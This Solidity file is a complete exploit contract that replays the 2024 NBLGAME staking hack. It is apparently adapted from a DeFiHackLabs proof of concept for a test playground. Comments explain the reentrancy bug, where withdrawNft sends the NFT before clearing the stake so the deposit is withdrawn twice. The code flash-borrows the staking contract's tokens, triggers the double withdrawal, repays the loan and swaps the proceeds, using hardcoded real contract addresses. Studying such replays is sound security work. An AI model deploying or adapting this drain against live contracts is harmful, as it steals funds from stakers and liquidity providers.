// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-NBLGAME).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the UniswapV3 flash callback `uniswapV3FlashCallback` and the ERC721
// reentrancy hook `onERC721Received` both live on the test itself, and the
// test calls `NBF.transferFrom` as `mainAttackContract` via `vm.prank`), so
// there is no standalone contract to deploy that would already hold the
// staked NFT / be approved for it. This contract is a faithful,
// self-contained copy of that inline attack, and it is deployed via
// `etchAt` at the HISTORICAL `mainAttackContract` address so it inherits
// that address's dumped on-chain state (ownership/approval context needed
// for the NBF.transferFrom(mainAttackContract, address(this), 737) step).
// Logic and constants are copied verbatim from test/NBLGAME_exp.sol.
//
// Root cause: NblNftStake.withdrawNft() transfers the staked NFT via
// `safeTransferFrom` BEFORE it clears the slot's `nblStakeAmount`. The
// resulting `onERC721Received` callback re-enters `withdrawNft` for the same
// slot while the stake amount is still non-zero, withdrawing the deposited
// NBL twice.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
}

interface INblNftStake {
    function unlockSlot() external;
    function depositNft(uint256 _tokenid, uint256 _index) external;
    function depositNbl(uint256 _index, uint256 _amount) external;
    function withdrawNft(uint256 _index) external;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract NBLGameDrain {
    IERC721 private constant NBF = IERC721(0x534e1a8a89548C44BE7abA1c3c27951801940C10);
    IERC20 private constant NBL = IERC20(0x4B03afC91295ed778320c2824bAd5eb5A1d852DD);
    IERC20 private constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IERC20 private constant WETH = IERC20(0x4200000000000000000000000000000000000006);
    IUniPairV3 private constant NBL_USDT = IUniPairV3(0xfAF037caAfA9620bFAebc04C298Bf4A104963613);
    IRouterV3 private constant Router = IRouterV3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    INblNftStake private constant NblNftStake = INblNftStake(0x5499178919C79086fd580d6c5f332a4253244D91);
    address private constant mainAttackContract = 0xE4D41BDD6459198B33Cc795ff280cEE02d91087b;

    // Deployed via `etchAt` (vm.etch), which places only the RUNTIME code and
    // never runs the constructor — a `= true` initializer would be silently
    // skipped, leaving this at its zero-value default. So this flag is
    // inverted versus the original inline test (`reenter` there defaults
    // true and flips to false after firing once): here `reentered` defaults
    // false (correct "haven't fired yet" state under etch) and flips to true
    // after firing once, guarding against a second reentry.
    bool private reentered;

    // step 0: pull the staked NFT into this contract, then flash-borrow the
    // stake contract's entire NBL balance to trigger the double-withdraw.
    function run() external {
        NBF.transferFrom(mainAttackContract, address(this), 737);
        require(NBF.ownerOf(737) == address(this), "did not receive NFT 737");

        NBL_USDT.flash(address(this), NBL.balanceOf(address(NblNftStake)), 0, "");

        NBLToUSDT();
        NBLToWETH();
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        require(msg.sender == address(NBL_USDT), "only NBL_USDT pool");

        USDT.approve(address(Router), type(uint256).max);
        USDT.approve(address(NblNftStake), type(uint256).max);
        NBL.approve(address(Router), type(uint256).max);
        NBL.approve(address(NblNftStake), type(uint256).max);
        uint256 returnAmount = NBL.balanceOf(address(NblNftStake));

        NBF.setApprovalForAll(address(NblNftStake), true);
        NblNftStake.unlockSlot();
        NblNftStake.depositNft(737, 0);
        NblNftStake.depositNbl(0, NBL.balanceOf(address(this)));
        // Vulnerable call: withdrawNft() sends the NFT via safeTransferFrom
        // BEFORE clearing nblStakeAmount, so the onERC721Received callback
        // below can re-enter and withdraw the same NBL deposit a second time.
        NblNftStake.withdrawNft(0);

        // Repaying flashloan
        NBL.transfer(address(NBL_USDT), returnAmount + fee0);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!reentered) {
            reentered = true;
            NBF.transferFrom(address(this), address(NblNftStake), 737);
            NblNftStake.withdrawNft(0);
            NblNftStake.depositNft(737, 0);
        }
        return this.onERC721Received.selector;
    }

    function NBLToUSDT() internal {
        IRouterV3.ExactInputSingleParams memory params = IRouterV3.ExactInputSingleParams({
            tokenIn: address(NBL),
            tokenOut: address(USDT),
            fee: 3000,
            recipient: address(this),
            amountIn: (NBL.balanceOf(address(this)) * 9) / 10,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        Router.exactInputSingle(params);
    }

    function NBLToWETH() internal {
        IRouterV3.ExactInputSingleParams memory params = IRouterV3.ExactInputSingleParams({
            tokenIn: address(NBL),
            tokenOut: address(WETH),
            fee: 3000,
            recipient: address(this),
            amountIn: NBL.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        Router.exactInputSingle(params);
    }
}
